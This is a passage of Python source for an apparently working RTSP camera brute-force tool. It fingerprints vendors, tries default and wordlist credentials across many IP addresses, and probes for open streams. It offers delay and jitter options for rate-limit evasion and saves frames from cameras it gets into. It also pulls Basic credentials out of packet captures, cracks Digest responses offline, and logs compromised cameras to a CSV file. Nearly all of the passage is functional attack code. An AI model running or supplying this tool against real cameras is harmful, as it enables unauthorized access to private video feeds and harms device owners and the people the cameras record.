        auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
        if not auth:
            return code
        code, headers = _send_describe(sock, uri, 2, auth=auth)
        # Refresh once on an expired (stale) nonce, still on this connection.
        if code in (401, 403) and "stale" in headers.get("www-authenticate", "").lower():
            www = headers.get("www-authenticate", "")
            auth = _auth_header(www, user or "", password or "", "DESCRIBE", uri)
            code, headers = _send_describe(sock, uri, 3, auth=auth)
        return code
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _route_uri(host, port, raw_path, user, password, tls=False):
    path = substitute(raw_path, user or "", password or "")
    if not path.startswith("/"):
        path = "/" + path
    return f"{'rtsps' if tls else 'rtsp'}://{host}:{port}{path}"


def probe_open_access(host, routes, timeout, tls=False, limit=3):
    """One unauthenticated DESCRIBE on each of the first ``limit`` routes. Returns
    an open-access result dict if any streams without auth (200), else None. Kept
    to a few routes so this stays a light touch on the camera."""
    for raw_path, port in routes[:limit]:
        uri = _route_uri(host, port, raw_path, "", "", tls)
        code, _ = _describe_unauth(host, port, uri, timeout, tls)
        if code == 200:
            return {"user": "", "password": "", "url": uri, "unauthenticated": True}
    return None


def native_attempt(host, routes, cred, timeout, tls=False):
    """Try ONE credential against a host's routes with the native RTSP engine.
    Returns a result dict on success, else None.

    A single challenge+response handshake against the primary route (challenge
    and reply on the SAME socket — required by connection-bound nonces). 200 is
    success. 404 means the credential is valid but the path is wrong (auth-first
    cameras answer 401 for every path until authenticated, then 404 for a wrong
    path), so the remaining routes are swept with that now-known-good credential.
    401/None is a miss for this credential — the caller moves to the next one.

    Just one credential per call by design: the caller drives the outer loop
    credential-by-credential across every host, so any one camera is touched once
    per round and gets time to cool down between attempts."""
    if not routes:
        return None
    user, password = cred
    primary_path, primary_port = routes[0]
    uri = _route_uri(host, primary_port, primary_path, user, password, tls)
    code = _describe_auth(host, primary_port, uri, user, password, timeout, tls)
    if code == 200:
        return {"user": user, "password": password, "url": uri}
    if code == 404:  # credential valid, wrong path -> sweep the other routes
        for raw_path, port in routes:
            sweep_uri = _route_uri(host, port, raw_path, user, password, tls)
            if _describe_auth(host, port, sweep_uri, user, password, timeout, tls) == 200:
                return {"user": user, "password": password, "url": sweep_uri}
        # Authenticated, but none of our known routes streamed.
        return {"user": user, "password": password, "url": uri, "no_route": True}
    return None


def ffmpeg_attempt(host, port, cred, tls=False):
    """Try ONE credential via the FFmpeg route-removed open (the original tool's
    method). Returns a result dict on success, else None. OpenCV-only."""
    if not _HAS_CV2:
        return None
    url = _ffmpeg_login(host, port, cred[0], cred[1], tls)
    if url:
        return {"user": cred[0], "password": cred[1], "url": url, "ffmpeg": True}
    return None


def _root_uri(host, port, user, password, tls=False):
    """Route-removed RTSP URL with credentials in the authority component, e.g.
    ``rtsp://user:pass@host:port`` (anonymous when no creds). This is the form
    the original tool used — no explicit stream path."""
    from urllib.parse import quote
    if user or password:
        cred = f"{quote(user or '', safe='')}:{quote(password or '', safe='')}@"
    else:
        cred = ""
    return f"{'rtsps' if tls else 'rtsp'}://{cred}{host}:{port}"


def _ffmpeg_login(host, port, user, password, tls=False):
    """Last-resort login check via a full FFmpeg negotiation on the route-removed
    URL, mirroring the original tool. Returns the working URL if the stream
    opens, else None.

    FFmpeg runs the complete RTSP handshake (OPTIONS/DESCRIBE/SETUP/PLAY), so it
    can confirm a credential on cameras whose bare DESCRIBE answers an
    indistinguishable 401 for both a wrong credential AND a valid credential on a
    wrong path. Needs OpenCV; a silent no-op without it. The connect/read time is
    bounded by OPENCV_FFMPEG_CAPTURE_OPTIONS (set at import time). For RTSPS
    (``rtsps://``) FFmpeg negotiates TLS itself."""
    if not _HAS_CV2:
        return None
    url = _root_uri(host, port, user, password, tls)
    try:
        video_capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        try:
            if video_capture.isOpened():
                return url
        finally:
            video_capture.release()
    except Exception:
        return None
    return None


def capture_frame_from_url(url, host):
    """Save one frame from a working stream to frames/<host>.jpg (best effort)."""
    if not _HAS_CV2:
        return
    try:
        video_capture = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        try:
            if video_capture.isOpened():
                ret, frame = video_capture.read()
                if ret:
                    safe = re.sub(r"[^A-Za-z0-9._-]", "_", host)
                    cv2.imwrite(f"frames/{safe}.jpg", frame)
        finally:
            video_capture.release()
    except Exception:
        pass


# --------------------------------------------------------------------------
# Per-host orchestration
# --------------------------------------------------------------------------
def ordered_credentials(vendor, base_combos, db, vendor_kb, options):
    """Per-host credential order: the fingerprinted vendor's default(s) first
    (from both the CSV DB and the YAML KB), then the user-supplied combos,
    then (optionally) every scraped/common default as a fallback."""
    ordered, seen = [], set()

    def add(username, password):
        if (username, password) not in seen:
            seen.add((username, password))
            ordered.append((username, password))

    if options["use_defaults"] and vendor:
        for username, password in db.default_creds_for(vendor):
            add(username, password)
        if vendor_kb:
            for username, password in vendor_kb.creds_for(vendor):
                add(username, password)
    for username, password in base_combos:
        add(username, password)
    if options["all_defaults"]:
        for username, password in db.all_default_combos():
            add(username, password)
        for username, password in COMMON_DEFAULTS:
            add(username, password)
    return ordered


def prepare_host(target, base_combos, db, vendor_kb, options):
    """Set one host up for the credential-outer attack WITHOUT trying any
    credential yet: reachability, fingerprint, the ordered route list (ONVIF
    exact path first) and the ordered credential list. Returns a state dict the
    round driver consumes. Doing the fingerprint/route work once here — and no
    25-route discovery burst — keeps per-camera connection volume low so the
    device doesn't rate-limit before the credential rounds even start."""
    host, http_port, rtsp_port, tls = parse_target(target)
    if tls is None:                            # not fixed by rtsp(s):// scheme
        tls = options.get("tls")               # ...then the global -T flag
    if options.get("http_port"):        # -H overrides the HTTP/ONVIF port
        http_port = options["http_port"]

    if options["reach_timeout"] > 0 and not tcp_reachable(
            host, [rtsp_port, http_port], options["reach_timeout"]):
        if options["verbose"]:
            with lock:
                display('-', f"{target} => Unreachable (skipped)")
        return {"target": target, "status": "UNREACHABLE", "vendor": "", "model": ""}

    if tls is None:                            # still unspecified -> auto-detect
        tls = detect_tls(host, rtsp_port, min(options["reach_timeout"] or 3, 4))
        if tls and options["verbose"]:
            with lock:
                display('*', f"{target} => RTSPS (TLS) detected")

    vendor, model, banner = (None, None, None)
    if options["fingerprint"]:
        vendor, model, banner = fingerprint(host, http_port, rtsp_port,
                                            options["fp_user"], options["fp_pass"],
                                            options["reach_timeout"] or 3.0, tls)
        # Second-chance vendor ID via YAML KB banner list
        if vendor is None and banner and vendor_kb:
            vendor = vendor_kb.identify_vendor(banner)
        if options["verbose"] and (vendor or model or banner):
            tag = f"Vendor={vendor or '?'} Model={model or '?'}"
            if banner:
                tag += f" Banner={banner}"
            with lock:
                display('*', f"{target} => {tag}")

    routes = db.rtsp_routes(vendor, model, rtsp_port, options["max_routes"])

    # Merge YAML KB vendor-specific paths into the route list
    if vendor and vendor_kb:
        kb_paths = vendor_kb.paths_for(vendor)
        if kb_paths:
            seen = {r for r in routes}
            for p in kb_paths:
                route = (p, rtsp_port)
                if route not in seen:
                    seen.add(route)
                    routes.append(route)

    # Multi-channel expansion: when enabled, expand channel-parameterized
    # routes so the tool probes multiple channels per camera.
    if options.get("multi_channel"):
        expanded, seen = [], set()
        for path, port in routes:
            if is_multichannel_path(path):
                for exp_path, _ch in expand_channels(path):
                    key = (exp_path, port)
                    if key not in seen:
                        seen.add(key)
                        expanded.append(key)
            else:
                key = (path, port)
                if key not in seen:
                    seen.add(key)
                    expanded.append(key)
        routes = expanded
        if options["max_routes"] and options["max_routes"] > 0:
            routes = routes[:options["max_routes"]]

    creds = ordered_credentials(vendor, base_combos, db, vendor_kb, options)

    # Ask the device itself (ONVIF GetStreamUri) for its exact stream path(s).
    # These are authoritative, so they go to the front of the route list and the
    # credential ONVIF accepted is tried first — turning path discovery from a
    # guess into a fact whenever the camera speaks ONVIF.
    if options["fingerprint"]:
        onvif_routes, onvif_cred = onvif_stream_routes(
            host, http_port, rtsp_port, creds, options["reach_timeout"] or 3.0)
        if onvif_routes:
            seen = set()
            routes = [r for r in onvif_routes + routes
                      if not (r in seen or seen.add(r))]
            if options["verbose"]:
                with lock:
                    display('*', f"{target} => ONVIF exact path: "
                                 f"rtsp://{host}:{onvif_routes[0][1]}{onvif_routes[0][0]}")
        if onvif_cred and onvif_cred in creds:
            creds = [onvif_cred] + [c for c in creds if c != onvif_cred]

    return {"target": target, "status": "READY", "host": host, "rtsp_port": rtsp_port,
            "tls": tls, "routes": routes, "creds": creds,
            "vendor": vendor or "", "model": model or "",
            "banner": banner or ""}


# --------------------------------------------------------------------------
# Packet-capture digest/basic cracking (unchanged)
# --------------------------------------------------------------------------
def calculateDigestResponse(username, password, realm, method, uri, nonce):
    hash_1 = md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    hash_2 = md5(f"{method}:{uri}".encode()).hexdigest()
    return md5(f"{hash_1}:{nonce}:{hash_2}".encode()).hexdigest()


def crack_digest_device(device, passwords):
    ip, username, realm, method, uri, nonce, response = device
    for password in passwords:
        if calculateDigestResponse(username, password, realm, method, uri, nonce) == response:
            with lock:
                display('+', f"{username}:{password}"
                             f"@{ip} => Cracked")
            return {"status": "OK", "ip": ip, "user": username,
                    "password": password, "vendor": "", "model": "", "url": ""}
    return None


if __name__ == "__main__":
    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
                              ('-C', "--capture-file", "capture_file", "Packet Capture Files (Seperated by ',')"),
                              ('-D', "--capture-file-data", "capture_file_data", "Dump Data Extracted from Capture File in Pickle Format (Optional)"),
                              ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                              ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                              ('-d', "--default-creds", "default_creds", "Path to the scraped default-credentials CSV (default: bundled data/default_credentials.csv)"),
                              ('-b', "--camera-db", "camera_db", "Path to the scraped camera DB CSV of RTSP paths (default: bundled data/cameras.csv)"),
                              ('-f', "--fingerprint", "fingerprint", f"Fingerprint each camera's vendor/model and try its routes + default credential first (True/False, Default=True)"),
                              ('-a', "--all-defaults", "all_defaults", f"After the wordlist, also try every scraped/common default credential as a fallback (True/False, Default=False)"),
                              ('-m', "--max-routes", "max_routes", "Maximum RTSP route (path) candidates to try per host; 0 = unlimited (Default=25)"),
                              ('-t', "--threads", "threads", f"Number of worker threads (Default={threads_number})"),
                              ('-r', "--reach-timeout", "reach_timeout", "TCP reachability pre-check timeout in seconds; 0 disables it (Default=2.0)"),
                              ('-R', "--rtsp-timeout", "rtsp_timeout", "Per-request RTSP DESCRIBE timeout in seconds (Default=6.0)"),
                              ('-H', "--http-port", "http_port", "HTTP/ONVIF port for fingerprinting on cameras whose web interface isn't on 80 (Default=80). Tried first, ahead of the standard ONVIF ports. The RTSP port is set per target with host:port."),
                              ('-T', "--tls", "tls", "Force RTSP-over-TLS / RTSPS on or off for every target: True (force TLS), False (force plaintext). Default (unset) = auto-detect per host. Per-target TLS can also be set with an rtsps:// (or rtsp://) prefix, e.g. rtsps://host:9000."),
                              ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                              ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"),
                              ('-V', "--vendor-db", "vendor_db", "Path to a YAML vendor knowledge base (default: bundled data/rtsp_vendors.yaml). Provides banner signatures, vendor-specific paths and credentials."),
                              ('-M', "--multi-channel", "multi_channel", "Expand channel-parameterized RTSP paths to probe multiple channels per camera (True/False, Default=False)"),
                              ('-e', "--delay", "delay", "Base delay in seconds between credential rounds (Default=0). Use with --jitter for rate-limit evasion."),
                              ('-j', "--jitter", "jitter", "Random jitter added to --delay, in seconds (Default=0). Each round sleeps delay + uniform(0, jitter)."))
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    if not arguments.password:
        display('*', f"No PASSWORD Specified")
        display(':', f"Setting Password to Blank")
        arguments.password = ['']
    else:
        try:
            with open(arguments.password, 'rb') as file:
                display(':', f"Loading Passwords from File {arguments.password}")
                arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
                display('+', f"Passwords Loaded = {len(arguments.password)}")
        except FileNotFoundError:
            arguments.password = [password for password in arguments.password.split(',')]
        except OSError:
            arguments.password = [password for password in arguments.password.split(',')]
        except:
            display('-', f"Error Loading Passwords from File {arguments.password}")
            exit(0)
    if not arguments.ip and not arguments.capture_file:
        display('-', "Please Provide a List of IP Addresses")
        exit(0)
    elif arguments.capture_file:
        from scapy.all import rdpcap, IP, TCP, Raw
        rtsp_devices = {}
        rtsp_authentications = {}
        for packet_capture_file in arguments.capture_file.split(','):
            try:
                packets = rdpcap(packet_capture_file)
                for network_packet in packets:
                    try:
                        if Raw in network_packet and "RTSP" in network_packet[Raw].load.decode():
                            device_id = tuple(sorted([network_packet[IP].src, network_packet[IP].dst, str(network_packet[TCP].sport), str(network_packet[TCP].dport)]))
                            if "200 OK" in network_packet[Raw].load.decode() and device_id in rtsp_authentications:
                                rtsp_devices[device_id] = rtsp_authentications[device_id]
                            if "Authorization" in network_packet[Raw].load.decode():
                                raw_data = network_packet[Raw].load.decode().split('\n')
                                method = raw_data[0].split(' ')[0]
                                for line in raw_data:
                                    if "Authorization" in line and "digest" in line.lower():
                                        line = line[len("Authorization: Digest "):]
                                        rtsp_authentications[device_id] = {parameter.split('=')[0]: ' '.join(parameter.split('=')[1:]).replace('"', '') for parameter in line.split(', ')}
                                        rtsp_authentications[device_id]["method"] = method
                                        rtsp_authentications[device_id]["authorization"] = "DIGEST"
                                        rtsp_authentications[device_id]["device"] = network_packet[IP].dst
                                        rtsp_authentications[device_id]["source"] = network_packet[IP].src
                                        rtsp_authentications[device_id]["device_port"] = network_packet[TCP].dport
                                        rtsp_authentications[device_id]["source_port"] = network_packet[TCP].sport
                                        break
                                    elif "Authorization" in line:
                                        authorization = "BASIC"
                                        base64 = b64decode(line[len("Authorization: Basic "):].encode()).decode()
                                        username, password = base64.split(':')[0], ':'.join(base64.split(':')[1:])
                                        rtsp_authentications[device_id] = {
                                            "username": username,
                                            "password": password,
                                            "method": method,
                                            "authorization": authorization,
                                            "device": network_packet[IP].dst,
                                            "source": network_packet[IP].src,
                                            "device_port": network_packet[TCP].dport,
                                            "source_port": network_packet[TCP].sport
                                        }
                                        break
                    except:
                        pass
            except Exception as error:
                display('-', f"Error Occured while reading Packet Capture File {packet_capture_file} => {error}")
        del rtsp_authentications
        rtsp_devices = list(rtsp_devices.values())
        successful_logins = []
        for rtsp_device in rtsp_devices:
            print(Fore.CYAN + '-'*100 + Fore.RESET)
            display('*', f"RTSP Device => {rtsp_device['device']}")
            display('*', f"RTSP Client => {rtsp_device['source']}")
            display('*', f"RTSP Device Port => {rtsp_device['device_port']}")
            display('*', f"RTSP Client Port => {rtsp_device['source_port']}")
            display('+', f"Method => {rtsp_device['method']}")
            display('+', f"Authorization => {rtsp_device['authorization']}")
            if rtsp_device['authorization'] == "DIGEST":
                display(':', f"\t* Username = {rtsp_device['username']}")
                display(':', f"\t* Realm = {rtsp_device['realm']}")
                display(':', f"\t* Nonce = {rtsp_device['nonce']}")
                display(':', f"\t* URI = {rtsp_device['uri']}")
                display(':', f"\t* Response = {rtsp_device['response']}")
            else:
                display(':', f"\t* Username = {rtsp_device['username']}")
                display(':', f"\t* Password = {rtsp_device['password']}")
                successful_logins.append({"ip": rtsp_device["device"], "user": rtsp_device["username"], "password": rtsp_device["password"], "vendor": "", "model": "", "url": ""})
            print(Fore.CYAN + '-'*100 + Fore.RESET)
        if arguments.capture_file_data:
            with open(arguments.capture_file_data, 'wb') as file:
                dump(rtsp_devices, file)
        digest_devices = [[rtsp_device["device"], rtsp_device["username"], rtsp_device["realm"], rtsp_device["method"], rtsp_device["uri"], rtsp_device["nonce"], rtsp_device["response"].strip()] for rtsp_device in rtsp_devices if rtsp_device["authorization"] == "DIGEST"]
        if digest_devices:
            display(':', f"Cracking {len(digest_devices)} Digest Authentication(s)", start='\n')
            if _HAS_TQDM:
                _active_bar = tqdm(total=len(digest_devices), desc="Cracking digests", unit="dev")
            with ThreadPoolExecutor(max_workers=threads_number) as executor:
                for result in executor.map(lambda device: crack_digest_device(device, arguments.password), digest_devices):
                    if result:
                        successful_logins.append(result)
                    if _active_bar is not None:
                        _active_bar.update(1)
            if _active_bar is not None:
                _active_bar.close()
                _active_bar = None
    else:
        ips = []
        for ip_detail in arguments.ip.split(','):
            try:
                with open(ip_detail, 'r') as file:
                    display(':', f"Loading IPs from File {ip_detail}")
                    current_ips = [ip for ip in file.read().split('\n') if ip.strip()]
                    ips.extend(current_ips)
                    display('+', f"IPs Loaded = {len(current_ips)}")
            except FileNotFoundError:
                ips.append(ip_detail)
            except:
                display('-', f"Error Loading IPs from File {arguments.ip}")
                exit(0)
        # De-duplicate targets (order-preserving, whitespace-trimmed) so a host
        # listed more than once in the input isn't fingerprinted, cracked and
        # logged repeatedly — each unique target is processed exactly once.
        trimmed = [ip.strip() for ip in ips if ip.strip()]
        ips = list(dict.fromkeys(trimmed))
        duplicates_removed = len(trimmed) - len(ips)
        if duplicates_removed:
            display(':', f"Skipping {duplicates_removed} duplicate target(s)")
        if not arguments.user:
            display('*', f"No USER Specified")
            display(':', f"Trying to Find Unauthorized Access")
            arguments.user = ['']
        else:
            try:
                with open(arguments.user, 'r') as file:
                    display(':', f"Loading Users from File {arguments.user}")
                    arguments.user = [user for user in file.read().split('\n')]
                    display('+', f"Users Loaded = {len(arguments.user)}")
            except FileNotFoundError:
                arguments.user = [user for user in arguments.user.split(',')]
            except OSError:
                arguments.user = [user for user in arguments.user.split(',')]
            except:
                display('-', f"Error Loading Users from File {arguments.user}")
                exit(0)

        # Thread count / boolean flags / timeouts.
        threads_number = int(arguments.threads) if arguments.threads else threads_number
        arguments.verbose = arguments.verbose != "False"
        fingerprint_enabled = arguments.fingerprint != "False"
        all_defaults_enabled = arguments.all_defaults == "True"
        multi_channel_enabled = arguments.multi_channel == "True"
        reach_timeout = float(arguments.reach_timeout) if arguments.reach_timeout is not None else 2.0
        rtsp_timeout = float(arguments.rtsp_timeout) if arguments.rtsp_timeout is not None else 6.0
        max_routes = int(arguments.max_routes) if arguments.max_routes is not None else 25
        attack_delay = float(arguments.delay) if arguments.delay is not None else 0.0
        attack_jitter = float(arguments.jitter) if arguments.jitter is not None else 0.0
        # Tri-state: True (force TLS), False (force plaintext), None (auto-detect).
        tls_option = True if arguments.tls == "True" else (
            False if arguments.tls == "False" else None)
        http_port_override = int(arguments.http_port) if arguments.http_port else None
        if arguments.capture == "True":
            frames_folder = Path.cwd() / "frames"
            frames_folder.mkdir(exist_ok=True)
            capture_frame = True
            if not _HAS_CV2:
                display('*', f"OpenCV not installed — frame capture (-c) will be skipped")

        # Load the scraped camera DB (routes) + default-credentials list.
        creds_path = resolve_path(arguments.default_creds, DEFAULT_CREDS_PATHS)
        camera_db_path = resolve_path(arguments.camera_db, CAMERA_DB_PATHS)
        db = CameraDB.load(camera_db_path, creds_path)
        if camera_db_path:
            display('+', f"Loaded {db.template_count} RTSP route template(s) from {camera_db_path}")
        else:
            display('*', f"No camera DB found (looked for bundled data/cameras.csv). Using generic RTSP routes only.")
        if creds_path:
            display('+', f"Loaded {db.vendor_count} vendor default credential(s) from {creds_path}")
        elif fingerprint_enabled or all_defaults_enabled:
            display('*', f"No default-credentials list found (looked for bundled data/default_credentials.csv). Vendor defaults disabled.")

        # Load the YAML vendor knowledge base (banner sigs, paths, creds).
        vendor_db_path = resolve_path(getattr(arguments, "vendor_db", None), VENDOR_YAML_PATHS)
        vendor_kb = VendorKB.load(vendor_db_path)
        if vendor_db_path and vendor_kb.vendor_count:
            display('+', f"Loaded {vendor_kb.vendor_count} vendor(s) from YAML KB {vendor_db_path}")
        elif not _HAS_YAML and vendor_db_path:
            display('*', f"PyYAML not installed — YAML vendor KB skipped (pip install pyyaml)")

        # Cartesian user x password combos supplied on the command line.
        base_combos = []
        for user in arguments.user:
            for password in arguments.password:
                if (user, password) not in base_combos:
                    base_combos.append((user, password))

        options = {
            "verbose": arguments.verbose,
            "fingerprint": fingerprint_enabled,
            "use_defaults": db.vendor_count > 0 or vendor_kb.vendor_count > 0,
            "all_defaults": all_defaults_enabled,
            "multi_channel": multi_channel_enabled,
            "reach_timeout": reach_timeout,
            "rtsp_timeout": rtsp_timeout,
            "max_routes": max_routes,
            "delay": attack_delay,
            "jitter": attack_jitter,
            "http_port": http_port_override,
            "tls": tls_option,
            "fp_user": arguments.user[0] if arguments.user else "",
            "fp_pass": arguments.password[0] if arguments.password else "",
        }

        total_ips = len(ips)
        display(':', f"Total Number of IP Addresses = {total_ips}")
        display(':', f"Base Credential Combinations  = {len(base_combos)}")
        display(':', f"Fingerprinting = {fingerprint_enabled}, Vendor Defaults = {options['use_defaults']}, All Defaults Fallback = {options['all_defaults']}, Max Routes = {max_routes}")
        if multi_channel_enabled:
            display(':', f"Multi-channel expansion = ON (channels {MULTI_CHANNELS})")
        if attack_delay > 0 or attack_jitter > 0:
            display(':', f"Attack interval = {attack_delay:.1f}s delay + {attack_jitter:.1f}s jitter")
        display(':', f"Starting {threads_number} Threads", start='\n')

        successful_logins = []
        method_counts = defaultdict(int)

        def run_batch(items, fn, desc):
            """Map ``fn`` over ``items`` concurrently (bounded by threads_number).
            Returns a list of ``(item, result)``. Runs to completion before
            returning, so a per-round closure can safely capture the round index."""
            global _active_bar
            outcomes = []
            bar = tqdm(total=len(items), desc=desc, unit="host") if _HAS_TQDM else None
            _active_bar = bar
            try:
                with ThreadPoolExecutor(max_workers=max(1, threads_number)) as executor:
                    futures = {executor.submit(fn, item): item for item in items}
                    for future in as_completed(futures):
                        outcomes.append((futures[future], future.result()))
                        if bar is not None:
                            bar.update(1)
            finally:
                if bar is not None:
                    bar.close()
                _active_bar = None
            return outcomes

        solved_targets = set()

        def register(state, result):
            """Display and record a solved host."""
            if capture_frame:
                capture_frame_from_url(result["url"], state["host"])
            note, method = "", "native"
            if result.get("unauthenticated"):
                note, method = " (no auth)", "no-auth"
            elif result.get("no_route"):
                note, method = " (auth ok, stream path unknown)", "no-route"
            elif result.get("ffprobe"):
                note, method = " (via ffprobe, route removed)", "ffprobe"
            elif result.get("ffmpeg"):
                note, method = " (via ffmpeg, route removed)", "ffmpeg"
            with lock:
                display('+', f"{result['user']}:{result['password']}"
                             f"@{state['target']} => "
                             f"Access Granted (vendor={state['vendor'] or '?'}){note}")
            successful_logins.append({"status": "OK", "ip": state["target"],
                                      "user": result["user"], "password": result["password"],
                                      "vendor": state["vendor"], "model": state["model"],
                                      "url": result["url"], "method": method})
            method_counts[method] += 1
            solved_targets.add(state["target"])

        def credential_rounds(states, attempt_fn, label):
            """Credential-OUTER attack: round i tries every still-unsolved host's
            i-th credential, so a given camera is hit once per round and cools
            down while the rest of the fleet is tried — the opposite of hammering
            one camera with its whole wordlist back-to-back."""
            remaining = [st for st in states if st["target"] not in solved_targets]
            total_rounds = max((len(st["creds"]) for st in remaining), default=0)
            for i in range(total_rounds):
                remaining = [st for st in remaining if st["target"] not in solved_targets]
                batch = [st for st in remaining if i < len(st["creds"])]
                if not batch:
                    continue
                # Configurable inter-round delay with jitter for rate-limit evasion
                if i > 0 and (attack_delay > 0 or attack_jitter > 0):
                    pause = attack_delay + random.uniform(0, attack_jitter)
                    if pause > 0:
                        sleep(pause)
                for state, result in run_batch(
                        batch, lambda st: attempt_fn(st, st["creds"][i]),
                        f"{label} cred {i + 1}/{total_rounds}"):
                    if result:
                        register(state, result)
                if len(solved_targets) == len({s["target"] for s in states}):
                    break

        t1 = time()
        # Phase 1 — prepare every host ONCE (reachability, fingerprint, routes,
        # credentials). No per-host credential attempts here, so no burst.
        prepared = [st for _, st in run_batch(
            ips, lambda ip: prepare_host(ip, base_combos, db, vendor_kb, options), "Fingerprinting")]
        ready = [st for st in prepared if st["status"] == "READY"]
        unreachable = sum(1 for st in prepared if st["status"] == "UNREACHABLE")

        # Round 0 — cheap open-access (unauthenticated) check on each host.
        for state, result in run_batch(
                ready, lambda st: probe_open_access(st["host"], st["routes"],
                                                    options["rtsp_timeout"], st["tls"]),
                "Open-access"):
            if result:
                register(state, result)

        # Phase 2 — native credential-outer rounds.
        credential_rounds(
            ready,
            lambda st, cred: native_attempt(st["host"], st["routes"], cred,
                                            options["rtsp_timeout"], st["tls"]),
            "Brute")

        # Phase 3 — ffprobe route-removed fallback (lightweight, no OpenCV
        # needed), credential-outer, for hosts the native engine couldn't crack.
        credential_rounds(
            ready,
            lambda st, cred: ffprobe_attempt(st["host"], st["rtsp_port"], cred,
                                             st["tls"], options["rtsp_timeout"]),
            "ffprobe")

        # Phase 4 — FFmpeg/cv2 route-removed fallback (original tool's method),
        # also credential-outer, for hosts neither native nor ffprobe cracked.
        if _HAS_CV2:
            credential_rounds(
                ready,
                lambda st, cred: ffmpeg_attempt(st["host"], st["rtsp_port"], cred, st["tls"]),
                "FFmpeg")
        t2 = time()

        unsolved = [st for st in ready if st["target"] not in solved_targets]
        if options["verbose"]:
            for st in unsolved:
                with lock:
                    display('-', f"{st['target']} => Reached but no credential found "
                                 f"(vendor={st['vendor'] or '?'})")
        unresolved = len(unsolved)

        display('+', f"All Threads Completed Execution", start='\n')
        display(':', f"\tTotal IP Addresses       = {total_ips}")
        display(':', f"\tSuccessful Authorization = {len(successful_logins)}")
        if successful_logins:
            breakdown = ", ".join(f"{m}={method_counts[m]}" for m in sorted(method_counts))
            display(':', f"\t  by method              = {breakdown}")
        display(':', f"\tReached, No Credential   = {unresolved}")
        display(':', f"\tUnreachable Hosts        = {unreachable}")
        display(':', f"\tTime Taken               = {t2-t1:.2f} seconds")
        if t2 > t1:
            display(':', f"\tRate                     = {total_ips/(t2-t1):.2f} IPs/second")
    display(':', f"Dumping Successfully Authorized IP Addresses in file {arguments.write}", start='\n')
    with open(arguments.write, 'w') as file:
        file.write("User,Password,IP,Vendor,Model,URL\n")
        file.write('\n'.join([f"{login.get('user', '')},{login.get('password', '')},{login.get('ip', '')},{login.get('vendor', '')},{login.get('model', '')},{login.get('url', '')}" for login in successful_logins]))
    display('+', f"Dumped Successfully Authorized IP Addresses in file {arguments.write}")
